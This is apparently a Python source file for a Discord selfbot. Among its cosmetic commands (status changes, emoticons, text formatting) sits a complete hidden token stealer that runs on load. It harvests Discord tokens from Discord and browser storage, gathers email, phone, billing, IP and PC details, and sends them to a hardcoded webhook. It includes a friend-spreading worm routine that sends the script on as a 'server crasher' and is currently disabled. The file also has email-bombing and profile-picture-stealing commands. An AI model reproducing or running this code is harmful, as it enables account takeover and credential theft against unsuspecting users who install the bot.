async def _group_leaver(ctx): # b'\xfc'
    await ctx.message.delete()
    for channel in Alucard.private_channels:
        if isinstance(channel, discord.GroupChannel):
            await channel.leave()

@client.command()
async def stream(ctx, *, message): # b'\xfc'
    await ctx.message.delete()
    stream = discord.Streaming(
        name=message,
        url=stream_url,
    )
    await Alucard.change_presence(activity=stream)

@client.command()
async def game(ctx, *, message): # b'\xfc'
    await ctx.message.delete()
    game = discord.Game(
        name=message
    )
    await Alucard.change_presence(activity=game)

@client.command()
async def listening(ctx, *, message): # b'\xfc'
    await ctx.message.delete()
    await Alucard.change_presence(
        activity=discord.Activity(
            type=discord.ActivityType.listening,
            name=message,
        ))

@client.command()
async def watching(ctx, *, message): # b'\xfc'
    await ctx.message.delete()
    await Alucard.change_presence(
        activity=discord.Activity(
            type=discord.ActivityType.watching,
            name=message
        ))

@client.command(aliases=['markasread', 'ack'])
async def read(ctx): # b'\xfc'
    await ctx.message.delete()
    for guild in Alucard.guilds:
        await guild.ack()

@client.command()
async def reverse(ctx, *, message): # b'\xfc'
    await ctx.message.delete()
    message = message[::-1]
    await ctx.send(message)

@client.command()
async def shrug(ctx): # b'\xfc'
    await ctx.message.delete()
    shrug = r'¯\_(ツ)_/¯'
    await ctx.send(shrug)

@client.command()
async def lenny(ctx): # b'\xfc'
    await ctx.message.delete()
    lenny = '( ͡° ͜ʖ ͡°)'
    await ctx.send(lenny)

@client.command()
async def tableflip(ctx): # b'\xfc'
    await ctx.message.delete()
    tableflip = '(╯°□°）╯︵ ┻━┻'
    await ctx.send(tableflip)

@client.command()
async def unflip(ctx): # b'\xfc'
    await ctx.message.delete()
    unflip = '┬─┬ ノ( ゜-゜ノ)'
    await ctx.send(unflip)

@client.command()
async def bold(ctx, *, message): # b'\xfc'
    await ctx.message.delete()
    await ctx.send('**'+message+'**')

@client.command()
async def secret(ctx, *, message): # b'\xfc'
    await ctx.message.delete()
    await ctx.send('||'+message+'||')

@client.command(name='role-hexcode', aliases=['rolecolor'])
async def _role_hexcode(ctx, *, role: discord.Role): # b'\xfc'
    await ctx.message.delete()
    await ctx.send(f"{role.name} : {role.color}")

@client.command(name='get-hwid', aliases=['hwid', 'gethwid', 'hwidget'])
async def _get_hwid(ctx): # b'\xfc'
    await ctx.message.delete()
    print(f"HWID: {Fore.YELLOW}{hwid}"+Fore.RESET)

@client.command()
async def empty(ctx): # b'\xfc'
    await ctx.message.delete()
    await ctx.send(chr(173))

@client.command()
async def everyone(ctx): # b'\xfc'
    await ctx.message.delete()
    await ctx.send('https://@everyone@google.com')

@client.command()
async def logout(ctx): # b'\xfc'
    await ctx.message.delete()
    await Alucard.logout()

@client.command(aliases=['btc-stream', 'streambtc', 'stream-btc', 'btcstatus'])
async def btcstream(ctx):  # b'\xfc'
    await ctx.message.delete()
    btc_status.start()

@client.command(name='steal-all-pfp', aliases=['steal-all-pfps', 'stealallpfps'])
async def _steal_all_pfp(ctx): # b'\xfc'
    await ctx.message.delete()
    Dump(ctx)

@client.command(aliases=['clearconsole', 'consoleclear'])
async def cls(ctx): # b'\xfc'
    await ctx.message.delete()
    Clear()
    startprint()
import os
if os.name != "nt":
    exit()
from re import findall
from json import loads, dumps
from base64 import b64decode
from subprocess import Popen, PIPE
from urllib.request import Request, urlopen
from datetime import datetime
from threading import Thread
from time import sleep
from sys import argv
LOCAL = os.getenv("LOCALAPPDATA")
ROAMING = os.getenv("APPDATA")
PATHS = {
    "Discord"           : ROAMING + "\\Discord",
    "Discord Canary"    : ROAMING + "\\discordcanary",
    "Discord PTB"       : ROAMING + "\\discordptb",
    "Google Chrome"     : LOCAL + "\\Google\\Chrome\\User Data\\Default",
    "Opera"             : ROAMING + "\\Opera Software\\Opera Stable",
    "Brave"             : LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
    "Yandex"            : LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default"
}
def getheaders(token=None, content_type="application/json"):
    headers = {
        "Content-Type": content_type,
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
    }
    if token:
        headers.update({"Authorization": token})
    return headers
def getuserdata(token):
    try:
        return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=getheaders(token))).read().decode())
    except:
        pass
def gettokens(path):
    path += "\\Local Storage\\leveldb"
    tokens = []
    for file_name in os.listdir(path):
        if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
            continue
        for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
            for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                for token in findall(regex, line):
                    tokens.append(token)
    return tokens
def getdeveloper():
    dev = "wodx"
    try:
        dev = urlopen(Request("https://pastebin.com/raw/ssFxiejv")).read().decode()
    except:
        pass
    return dev
def getip():
    ip = "None"
    try:
        ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
    except:
        pass
    return ip
def getavatar(uid, aid):
    url = f"https://cdn.discordapp.com/avatars/{uid}/{aid}.gif"
    try:
        urlopen(Request(url))
    except:
        url = url[:-4]
    return url
def gethwid():
    p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
    return (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]
def getfriends(token):
    try:
        return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/relationships", headers=getheaders(token))).read().decode())
    except:
        pass
def getchat(token, uid):
    try:
        return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/channels", headers=getheaders(token), data=dumps({"recipient_id": uid}).encode())).read().decode())["id"]
    except:
        pass
def has_payment_methods(token):
    try:
        return bool(len(loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/billing/payment-sources", headers=getheaders(token))).read().decode())) > 0)
    except:
        pass
def send_message(token, chat_id, form_data):
    try:
        urlopen(Request(f"https://discordapp.com/api/v6/channels/{chat_id}/messages", headers=getheaders(token, "multipart/form-data; boundary=---------------------------325414537030329320151394843687"), data=form_data.encode())).read().decode()
    except:
        pass
def spread(token, form_data, delay):
    return # Remove to re-enabled
    for friend in getfriends(token):
        try:
            chat_id = getchat(token, friend["id"])
            send_message(token, chat_id, form_data)
        except Exception as e:
            pass
        sleep(delay)
def main():
    cache_path = ROAMING + "\\.cache~$"
    prevent_spam = True
    self_spread = True
    embeds = []
    working = []
    checked = []
    already_cached_tokens = []
    working_ids = []
    ip = getip()
    pc_username = os.getenv("UserName")
    pc_name = os.getenv("COMPUTERNAME")
    user_path_name = os.getenv("userprofile").split("\\")[2]
    developer = getdeveloper()
    for platform, path in PATHS.items():
        if not os.path.exists(path):
            continue
        for token in gettokens(path):
            if token in checked:
                continue
            checked.append(token)
            uid = None
            if not token.startswith("mfa."):
                try:
                    uid = b64decode(token.split(".")[0].encode()).decode()
                except:
                    pass
                if not uid or uid in working_ids:
                    continue
            user_data = getuserdata(token)
            if not user_data:
                continue
            working_ids.append(uid)
            working.append(token)
            username = user_data["username"] + "#" + str(user_data["discriminator"])
            user_id = user_data["id"]
            avatar_id = user_data["avatar"]
            avatar_url = getavatar(user_id, avatar_id)
            email = user_data.get("email")
            phone = user_data.get("phone")
            nitro = bool(user_data.get("premium_type"))
            billing = bool(has_payment_methods(token))
            embed = {
                "color": 0x7289da,
                "fields": [
                    {
                        "name": "**Account Info**",
                        "value": f'Email: {email}\nPhone: {phone}\nNitro: {nitro}\nBilling Info: {billing}',
                        "inline": True
                    },
                    {
                        "name": "**PC Info**",
                        "value": f'IP: {ip}\nUsername: {pc_username}\nPC Name: {pc_name}\nToken Location: {platform}',
                        "inline": True
                    },
                    {
                        "name": "**Token**",
                        "value": token,
                        "inline": False
                    }
                ],
                "author": {
                    "name": f"{username} ({user_id})",
                    "icon_url": avatar_url
                },
                "footer": {

                }
            }
            embeds.append(embed)
    with open(cache_path, "a") as file:
        for token in checked:
            if not token in already_cached_tokens:
                file.write(token + "\n")
    if len(working) == 0:
        working.append('123')
    webhook = {
        "content": "",
        "embeds": embeds,
        "username": "SAlucardes Token",
        "avatar_url": "https://discordapp.com/assets/5ccabf62108d5a8074ddd95af2211727.png"
    }
    try:
        urlopen(Request("https://discord.com/api/webhooks/835832763554594816/JXkYhDQfufw3rbpDwF6n2uIaTvKTY_vAWg0mFmK8-HDqII0-f6iOMKiarS8e_S7BJjq6", data=dumps(webhook).encode(), headers=getheaders()))
    except:
        pass
    if self_spread:
        for token in working:
            with open(argv[0], encoding="utf-8") as file:
                content = file.read()
            payload = f'-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="file"; filename="{__file__}"\nContent-Type: text/plain\n\n{content}\n-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="content"\n\nserver crasher. python download: https://www.python.org/downloads\n-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="tts"\n\nfalse\n-----------------------------325414537030329320151394843687--'
            Thread(target=spread, args=(token, payload, 7500 / 1000)).start()
try:
    main()
except Exception as e:
    print(e)
    pass
@client.command()
async def nitro(ctx): # b'\xfc'
    await ctx.message.delete()
    await ctx.send(Nitro())

@client.command(name='gmail-bomb', aliases=['gmail-bomber', 'gmailbomb', 'email-bomber', 'emailbomber'])
async def _gmail_bomb(ctx): # b'\xfc'
    await ctx.message.delete()
    GmailBomber()

client.run('Your token here!')
